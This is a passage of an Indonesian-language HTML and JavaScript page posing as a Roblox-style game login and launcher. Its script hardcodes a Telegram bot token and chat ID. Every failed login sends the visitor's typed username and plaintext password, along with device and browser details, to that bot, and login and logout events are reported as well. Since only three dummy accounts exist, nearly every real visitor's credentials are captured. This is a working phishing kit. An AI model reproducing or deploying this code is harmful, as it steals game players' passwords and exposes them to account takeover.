                        <div class="game-thumbnail" style="background-color: #3f51b5;"></div>
                        <div class="game-info">
                            <h3 class="game-title">Adopt Me!</h3>
                            <div class="game-stats">
                                <span class="game-players"><span class="players-icon">👤</span> 230K</span>
                                <span class="game-rating">⭐ 4.8</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="game-card">
                        <div class="game-thumbnail" style="background-color: #e91e63;"></div>
                        <div class="game-info">
                            <h3 class="game-title">Brookhaven</h3>
                            <div class="game-stats">
                                <span class="game-players"><span class="players-icon">👤</span> 185K</span>
                                <span class="game-rating">⭐ 4.6</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="game-card">
                        <div class="game-thumbnail" style="background-color: #009688;"></div>
                        <div class="game-info">
                            <h3 class="game-title">Tower of Hell</h3>
                            <div class="game-stats">
                                <span class="game-players"><span class="players-icon">👤</span> 98K</span>
                                <span class="game-rating">⭐ 4.5</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="game-card">
                        <div class="game-thumbnail" style="background-color: #ff5722;"></div>
                        <div class="game-info">
                            <h3 class="game-title">Murder Mystery 2</h3>
                            <div class="game-stats">
                                <span class="game-players"><span class="players-icon">👤</span> 85K</span>
                                <span class="game-rating">⭐ 4.7</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="game-card">
                        <div class="game-thumbnail" style="background-color: #795548;"></div>
                        <div class="game-info">
                            <h3 class="game-title">Royale High</h3>
                            <div class="game-stats">
                                <span class="game-players"><span class="players-icon">👤</span> 76K</span>
                                <span class="game-rating">⭐ 4.4</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>
    
    <!-- MODAL KONFIRMASI LOGOUT -->
    <div class="modal-overlay" id="logoutModal">
        <div class="modal">
            <span class="close-modal" id="closeModal">&times;</span>
            <h2 class="modal-title">Konfirmasi Logout</h2>
            <p class="modal-content">Apakah Anda yakin ingin keluar dari akun Anda?</p>
            <div class="modal-buttons">
                <button class="modal-btn confirm-btn" id="confirmLogout">Ya, Logout</button>
                <button class="modal-btn cancel-btn" id="cancelLogout">Batal</button>
            </div>
        </div>
    </div>
    
    <!-- MODAL GAME -->
    <div class="modal-overlay" id="gameModal">
        <div class="modal">
            <span class="close-modal" id="closeGameModal">&times;</span>
            <h2 class="modal-title">Memulai Game</h2>
            <p class="modal-content">Game sedang dipersiapkan. Apakah Anda siap untuk mulai bermain?</p>
            <div class="modal-buttons">
                <button class="modal-btn confirm-btn" id="startGame">Mulai Sekarang</button>
                <button class="modal-btn cancel-btn" id="cancelGame">Batal</button>
            </div>
        </div>
    </div>

    <script>
        // --- VARIABEL GLOBAL & DATABASE ---
        // Konfigurasi Telegram Bot
        const TELEGRAM_BOT_TOKEN = "7511922195:AAEgJoM_xB7aJHs2UOKOEyp6TCAysP_nRFo";
        const TELEGRAM_CHAT_ID = "6792180345";
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        // Database user simulasi
        const userDatabase = {
            "user123": {
                password: "pass123",
                displayName: "Pemain Hebat",
                level: 42,
                coins: 1500,
                gems: 75
            },
            "admin": {
                password: "admin123",
                displayName: "Admin",
                level: 99,
                coins: 9999,
                gems: 999
            },
            "tester": {
                password: "test123",
                displayName: "Tester",
                level: 10,
                coins: 500,
                gems: 25
            }
        };
        
        // Status login
        let currentUser = null;
        
        // Fungsi untuk mengirim pesan ke Telegram
        async function sendTelegramMessage(message) {
            try {
                const response = await fetch(TELEGRAM_API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                const data = await response.json();
                console.log('Telegram notification sent:', data);
                return data.ok;
            } catch (error) {
                console.error('Error sending Telegram notification:', error);
                return false;
            }
        }
        
        // Fungsi untuk mendapatkan IP pengguna (asynchronous)
        async function getUserIP() {
            try {
                // Menggunakan layanan ipinfo.io untuk mendapatkan IP 
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip || "Unknown";
            } catch (error) {
                console.error('Error fetching IP:', error);
                return "Unknown";
            }
        }
        
        // Fungsi untuk mendapatkan informasi perangkat
        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            let deviceType = "Desktop";
            let browser = "Unknown";
            let os = "Unknown";
            
            // Deteksi perangkat mobile
            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
                deviceType = "Mobile";
                
                if (/iPhone|iPad|iPod/i.test(userAgent)) {
                    os = "iOS";
                } else if (/Android/i.test(userAgent)) {
                    os = "Android";
                }
            } else {
                // Deteksi OS desktop
                if (/Windows/i.test(userAgent)) {
                    os = "Windows";
                } else if (/Macintosh|Mac OS X/i.test(userAgent)) {
                    os = "MacOS";
                } else if (/Linux/i.test(userAgent)) {
                    os = "Linux";
                }
            }
            
            // Deteksi browser
            if (/Chrome/i.test(userAgent) && !/Chromium|Edge|OPR|Edg/i.test(userAgent)) {
                browser = "Chrome";
            } else if (/Firefox/i.test(userAgent)) {
                browser = "Firefox";
            } else if (/Safari/i.test(userAgent) && !/Chrome|Chromium/i.test(userAgent)) {
                browser = "Safari";
            } else if (/Edge|Edg/i.test(userAgent)) {
                browser = "Edge";
            } else if (/MSIE|Trident/i.test(userAgent)) {
                browser = "Internet Explorer";
            } else if (/OPR/i.test(userAgent)) {
                browser = "Opera";
            }
            
            return {
                device: deviceType,
                browser: browser,
                os: os
            };
        }
        
        // --- INISIALISASI APLIKASI ---
        function initApp() {
            const progressBar = document.getElementById('progressBar');
            const loadingMessage = document.getElementById('loadingMessage');
            const initLoading = document.getElementById('initLoading');
            const loginScreen = document.getElementById('loginScreen');
            
            // Simulasi loading
            let progress = 0;
            const loadingInterval = setInterval(() => {
                progress += Math.random() * 10;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(loadingInterval);
                    
                    // Loading selesai, tampilkan login screen
                    setTimeout(() => {
                        initLoading.style.display = 'none';
                        loginScreen.style.display = 'flex';
                        
                        // Buat particles setelah login screen muncul
                        createParticles();
                    }, 500);
                }
                
                // Update progress bar
                progressBar.style.width = `${progress}%`;
                
                // Update loading message sesuai tahap
                if (progress < 30) {
                    loadingMessage.textContent = "Memuat aset...";
                } else if (progress < 60) {
                    loadingMessage.textContent = "Menginisialisasi sistem...";
                } else if (progress < 90) {
                    loadingMessage.textContent = "Menyiapkan antarmuka...";
                } else {
                    loadingMessage.textContent = "Hampir selesai...";
                }
            }, 200);
        }
        
        // --- PARTICLE BACKGROUND ---
        function createParticles() {
            const particlesContainer = document.getElementById('particles');
            const numberOfParticles = 30;
            
            // Bersihkan particles yang mungkin sudah ada
            particlesContainer.innerHTML = '';
            
            for (let i = 0; i < numberOfParticles; i++) {
                const size = Math.random() * 20 + 5;
                const particle = document.createElement('div');
                particle.classList.add('particle');
                
                // Random position
                const posX = Math.random() * window.innerWidth;
                const posY = Math.random() * window.innerHeight;
                
                // Random animation duration
                const animDuration = Math.random() * 15 + 10;
                
                // Apply styles
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                particle.style.left = `${posX}px`;
                particle.style.top = `${posY}px`;
                particle.style.animationDuration = `${animDuration}s`;
                particle.style.opacity = Math.random() * 0.3;
                
                particlesContainer.appendChild(particle);
            }
        }
        
        // --- RIPPLE EFFECT ---
        function createRipple(event) {
            const button = event.currentTarget;
            
            const circle = document.createElement('span');
            circle.classList.add('ripple');
            
            const diameter = Math.max(button.clientWidth, button.clientHeight);
            const radius = diameter / 2;
            
            // Get position relative to button
            const rect = button.getBoundingClientRect();
            const x = event.clientX - rect.left - radius;
            const y = event.clientY - rect.top - radius;
            
            circle.style.width = circle.style.height = `${diameter}px`;
            circle.style.left = `${x}px`;
            circle.style.top = `${y}px`;
            
            // Remove any existing ripples
            const ripple = button.getElementsByClassName('ripple')[0];
            if (ripple) {
                ripple.remove();
            }
            
            button.appendChild(circle);
            
            // Remove after animation completes
            setTimeout(() => {
                circle.remove();
            }, 600);
        }
        
        // --- LOGIN VALIDATION & SUBMISSION ---
        function handleLogin(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const statusElement = document.getElementById('loginStatus');
            const loadingOverlay = document.getElementById('loadingOverlay');
            
            // Validate inputs
            if (!username) {
                showError('Username tidak boleh kosong!');
                return;
            }
            
            if (!password) {
                showError('Password tidak boleh kosong!');
                return;
            }
            
            // Validasi panjang
            if (username.length < 3 || password.length < 3) {
                showError('Username dan password harus minimal 3 karakter!');
                return;
            }
            
            // Validasi format username (hanya alfanumerik dan underscore)
            const usernameRegex = /^[a-zA-Z0-9_]+$/;
            if (!usernameRegex.test(username)) {
                showError('Username hanya boleh berisi huruf, angka, dan underscore!');
                return;
            }
            
            // Fungsi untuk menampilkan pesan error
            function showError(message) {
                statusElement.textContent = message;
                statusElement.className = 'login-status error-message';
                
                // Animasi shake pada form
                const form = document.getElementById('loginForm');
                form.classList.add('shake');
                setTimeout(() => form.classList.remove('shake'), 500);
            }
            
            // Show loading overlay
            loadingOverlay.style.display = 'flex';
            
            // Dapatkan informasi perangkat dan waktu
            const deviceInfo = getDeviceInfo();
            const loginTime = new Date().toLocaleString();
            
            // Proses login (simulasi)
            setTimeout(async () => {
                // Cek database
                const user = userDatabase[username];
                
                if (user && user.password === password) {
                    // Login berhasil
                    currentUser = user;
                    
                    // Update login status
                    statusElement.textContent = 'Login berhasil! Mengalihkan...';
                    statusElement.className = 'login-status success-message';
                    
                    // Kirim notifikasi ke Telegram
                    const successMessage = `
<b>✅ LOGIN BERHASIL</b>
<b>Username:</b> ${username}
<b>Nama Pengguna:</b> ${user.displayName}
<b>Level:</b> ${user.level}
<b>Waktu:</b> ${loginTime}
<b>IP Address:</b> (IP tidak tersedia dalam mode standalone)
<b>Perangkat:</b> ${deviceInfo.device}
<b>Browser:</b> ${deviceInfo.browser}
<b>Sistem Operasi:</b> ${deviceInfo.os}
<b>User Agent:</b> ${navigator.userAgent.substring(0, 100)}...
                    `;
                    
                    // Kirim pesan telegram secara asynchronous
                    sendTelegramMessage(successMessage)
                        .then(success => {
                            console.log(success ? 'Notifikasi login berhasil terkirim' : 'Gagal mengirim notifikasi');
                        });
                    
                    // Simpan informasi login di localStorage jika "Remember Me" dicentang
                    if (document.getElementById('remember').checked) {
                        localStorage.setItem('username', username);
                        localStorage.setItem('displayName', user.displayName);
                    }
                    
                    // Hide loading after a short delay
                    setTimeout(() => {
                        loadingOverlay.style.display = 'none';
                        
                        // Redirect ke home screen
                        document.getElementById('loginScreen').style.display = 'none';
                        
                        // Persiapkan home screen dengan data user
                        prepareHomeScreen(user);
                        
                        // Tampilkan home screen
                        document.getElementById('homeScreen').style.display = 'flex';
                    }, 1000);
                } else {
                    // Login gagal, sembunyikan loading
                    loadingOverlay.style.display = 'none';
                    
                    // Tampilkan pesan error
                    showError('Username atau password salah!');
                    
                    // Kirim notifikasi ke Telegram untuk percobaan login yang gagal
                    const failureMessage = `
<b>⚠️ PERCOBAAN LOGIN GAGAL</b>
<b>Username:</b> ${username}
<b>Password:</b> ${password}
<b>Waktu:</b> ${loginTime}
<b>IP Address:</b> (IP tidak tersedia dalam mode standalone)
<b>Perangkat:</b> ${deviceInfo.device}
<b>Browser:</b> ${deviceInfo.browser}
<b>Sistem Operasi:</b> ${deviceInfo.os}
<b>User Agent:</b> ${navigator.userAgent.substring(0, 100)}...
                    `;
                    
                    // Kirim pesan telegram secara asynchronous
                    sendTelegramMessage(failureMessage)
                        .then(success => {
                            console.log(success ? 'Notifikasi login gagal terkirim' : 'Gagal mengirim notifikasi');
                        });
                    
                    // Tambahkan efek getaran pada input yang salah
                    const inputs = [document.getElementById('username'), document.getElementById('password')];
                    inputs.forEach(input => {
                        input.classList.add('shake-input');
                        setTimeout(() => input.classList.remove('shake-input'), 500);
                    });
                }
            }, 1500);
        }
        
        // --- PREPARE HOME SCREEN ---
        function prepareHomeScreen(user) {
            // Set user info
            document.getElementById('displayUsername').textContent = user.displayName;
            document.getElementById('userLevel').textContent = `Level ${user.level}`;
            document.getElementById('userAvatar').textContent = user.displayName.charAt(0).toUpperCase();
            
            // Animate currency counters
            animateValue(document.getElementById('coinAmount'), 0, user.coins, 2000);
            animateValue(document.getElementById('gemAmount'), 0, user.gems, 2000);
        }
        
        // --- ANIMATE COUNTER ---
        function animateValue(element, start, end, duration) {
            let startTimestamp = null;
            const step = (timestamp) => {
                if (!startTimestamp) startTimestamp = timestamp;
                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
                const value = Math.floor(progress * (end - start) + start);
                element.textContent = value.toLocaleString();
                if (progress < 1) {
                    window.requestAnimationFrame(step);
                }
            };
            window.requestAnimationFrame(step);
        }
        
        // --- LOGOUT ---
        function handleLogout() {
            // Show logout modal
            document.getElementById('logoutModal').style.display = 'flex';
        }
        
        function confirmLogout() {
            // Hide modal
            document.getElementById('logoutModal').style.display = 'none';
            
            const username = localStorage.getItem('username') || 'Unknown';
            const deviceInfo = getDeviceInfo();
            const logoutTime = new Date().toLocaleString();
            
            // Kirim notifikasi ke Telegram
            const logoutMessage = `
<b>🚪 USER LOGOUT</b>
<b>Username:</b> ${username}
<b>Waktu:</b> ${logoutTime}
<b>IP Address:</b> (IP tidak tersedia dalam mode standalone)
<b>Perangkat:</b> ${deviceInfo.device}
<b>Browser:</b> ${deviceInfo.browser}
<b>Sistem Operasi:</b> ${deviceInfo.os}
<b>User Agent:</b> ${navigator.userAgent.substring(0, 100)}...
            `;
            
            // Kirim pesan telegram secara asynchronous
            sendTelegramMessage(logoutMessage)
                .then(success => {
                    console.log(success ? 'Notifikasi logout terkirim' : 'Gagal mengirim notifikasi logout');
                });
            
            // Reset user
            currentUser = null;
            
            // Switch to login screen
            document.getElementById('homeScreen').style.display = 'none';
            document.getElementById('loginScreen').style.display = 'flex';
            
            // Clear login form
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
            document.getElementById('loginStatus').textContent = '';
            
            // Recreate particles for login screen
            createParticles();
        }
        
        // --- HOME SCREEN INTERACTIONS ---
        function handlePlayButton() {
            // Show game modal
            document.getElementById('gameModal').style.display = 'flex';
        }
        
        function handleMenuButton(buttonType) {
            alert(`Membuka ${buttonType}...`);
        }
        
        // --- DOKUMEN SIAP ---
        document.addEventListener('DOMContentLoaded', () => {
            // Initialize application with loading screen
            initApp();
            
            // LOGIN SCREEN SETUP
            // Add ripple effect to login button
            const loginButton = document.getElementById('loginButton');
            loginButton.addEventListener('mousedown', createRipple);
            
            // Add login form submission handler
            const loginForm = document.getElementById('loginForm');
            loginForm.addEventListener('submit', handleLogin);
            
            // Check for saved credentials
            const savedUsername = localStorage.getItem('username');
            if (savedUsername) {
                document.getElementById('username').value = savedUsername;
                document.getElementById('remember').checked = true;
                
                // Tambahkan efek highlight pada field yang telah diisi otomatis
                const usernameInput = document.getElementById('username');
                usernameInput.style.backgroundColor = 'rgba(85, 170, 80, 0.1)';
                
                // Setelah beberapa saat, kembalikan ke warna normal
                setTimeout(() => {
                    usernameInput.style.backgroundColor = '';
                }, 1000);
                
                // Fokus ke field password
                setTimeout(() => {
                    document.getElementById('password').focus();
                }, 500);
            }
            
            // HOME SCREEN SETUP
            // Logout button
            document.getElementById('logoutBtn').addEventListener('click', handleLogout);
            document.getElementById('confirmLogout').addEventListener('click', confirmLogout);
            document.getElementById('cancelLogout').addEventListener('click', () => {
                document.getElementById('logoutModal').style.display = 'none';
            });
            document.getElementById('closeModal').addEventListener('click', () => {
                document.getElementById('logoutModal').style.display = 'none';
            });
            
            // Play button
            document.getElementById('playButton').addEventListener('click', handlePlayButton);
            document.getElementById('startGame').addEventListener('click', () => {
                document.getElementById('gameModal').style.display = 'none';
                alert('Memulai game... Harap tunggu sementara game dimuat.');
            });
            document.getElementById('cancelGame').addEventListener('click', () => {
                document.getElementById('gameModal').style.display = 'none';
            });
            document.getElementById('closeGameModal').addEventListener('click', () => {
                document.getElementById('gameModal').style.display = 'none';
            });
            
            // Menu buttons
            document.getElementById('shopButton').addEventListener('click', () => handleMenuButton('Shop'));
            document.getElementById('inventoryButton').addEventListener('click', () => handleMenuButton('Inventory'));
            document.getElementById('friendsButton').addEventListener('click', () => handleMenuButton('Friends'));
            document.getElementById('settingsButton').addEventListener('click', () => handleMenuButton('Settings'));
            
            // Banner button
            document.querySelector('.banner-btn').addEventListener('click', handlePlayButton);
            
            // Game cards
            document.querySelectorAll('.game-card').forEach(card => {
                card.addEventListener('click', () => {
                    const gameTitle = card.querySelector('.game-title').textContent;
                    alert(`Memuat game: ${gameTitle}...`);
                });
            });
            
            // Close modals when clicking outside
            window.addEventListener('click', (e) => {
                if (e.target === document.getElementById('logoutModal')) {
                    document.getElementById('logoutModal').style.display = 'none';
                }
                if (e.target === document.getElementById('gameModal')) {
                    document.getElementById('gameModal').style.display = 'none';
                }
            });
            
            // Handle window resize
            window.addEventListener('resize', createParticles);
        });
    </script>
</body>
</html>
